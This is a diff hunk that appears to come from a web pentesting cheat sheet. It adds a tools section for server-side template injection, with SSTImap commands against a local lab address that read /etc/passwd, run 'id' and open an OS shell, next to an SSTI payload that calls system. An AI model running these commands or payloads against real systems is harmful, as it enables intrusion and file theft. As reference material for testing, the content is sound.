@@ -939,6 +939,18 @@ ${{<%[%'"}}%\.
 {{ ['id'] | filter('system') }}
 ```
 
+- Tools
+
+```
+https://github.com/epinna/tplmap
+https://github.com/vladko312/SSTImap
+$ python3 sstimap.py
+$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
+$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
+$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
+$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
+```
+
 - Server-Side Includes (SSI) Injection
 
 *Arise when an application incorporates user-controllable data into response that is then parsed for Server-Side Include directives.*
